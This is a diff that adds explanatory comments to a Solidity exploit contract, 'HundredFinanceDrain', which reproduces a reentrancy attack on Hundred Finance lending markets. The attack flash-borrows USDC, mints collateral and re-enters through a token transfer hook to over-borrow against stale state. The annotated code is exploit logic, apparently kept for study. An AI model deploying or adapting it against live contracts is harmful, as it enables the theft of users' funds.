@@ -22,6 +22,9 @@ pragma solidity ^0.8.10;
 // first is half-applied: the Comptroller's liquidity check sees the freshly-
 // minted collateral but not yet the first borrow's debt, so it approves an
 // over-borrow on the hXDAI (CEther) market.
+
+// VULNERABILITY: `borrowFresh` (see CEther.sol:1978 and equivalent in CErc20 impl) performs the external transfer BEFORE the EFFECTS that mutate accountBorrows/totalBorrows. The nonReentrant modifier on borrowInternal does not protect against re-entrancy coming from the *token* callback into a different cToken. Liquidity checks in Comptroller are performed with in-flight state.
+
 //
 // Attack flow (one flash swap, all in one tx):
 //   1. Flash-borrow ~all the wxDAI/USDC Sushi pair's USDC via pair.swap.
@@ -83,6 +86,8 @@ contract HundredFinanceDrain {
     bool xdaiBorrowed = false;
 
     function run() external {
+        // EXPLOIT STEPS: See detailed sequence in the inline PoC (HundredFinance_exp.sol). High-level:
+        // Flash USDC -> mint collateral on hUSDC -> borrow on hUSDC (reenter via onTokenTransfer during transfer) -> borrow on hXDAI under stale collateral view -> swap profits -> repay flash.
         borrow();
     }
 
@@ -116,17 +121,20 @@ contract HundredFinanceDrain {
     function depositUsdc() internal {
         uint256 balance = usdc.balanceOf(address(this));
         usdc.approve(husd, balance);
+        // EXPLOIT STEPS (setup collateral): this mint populates the attacker's position in Comptroller so the subsequent reentrant borrow can pass borrowAllowed.
         ICompoundToken(husd).mint(balance);
     }
 
     function borrowUsdc() internal {
         uint256 amount = (totalBorrowed * 90) / 100;
+        // VULNERABILITY: call into borrow triggers token hook reentrancy before this market's state is updated.
         ICompoundToken(husd).borrow(amount);
     }
 
     function borrowXdai() internal {
         xdaiBorrowed = true;
         uint256 amount = ((totalBorrowed * 1e12) * 60) / 100;
+        // EXPLOIT STEPS: reentrant borrow that would have been blocked if first borrow state had been applied.
         ICompoundToken(hxdai).borrow(amount);
     }
 
@@ -141,6 +149,7 @@ contract HundredFinanceDrain {
         address pair = factory.getPair(address(wxdai), address(usdc));
 
         if (_from != pair && xdaiBorrowed == false) {
+            // VULNERABILITY TRIGGER: ERC-677/ERC-667 hook called by token during doTransferOut, before borrowFresh returns and writes state.
             borrowXdai();
         }
     }
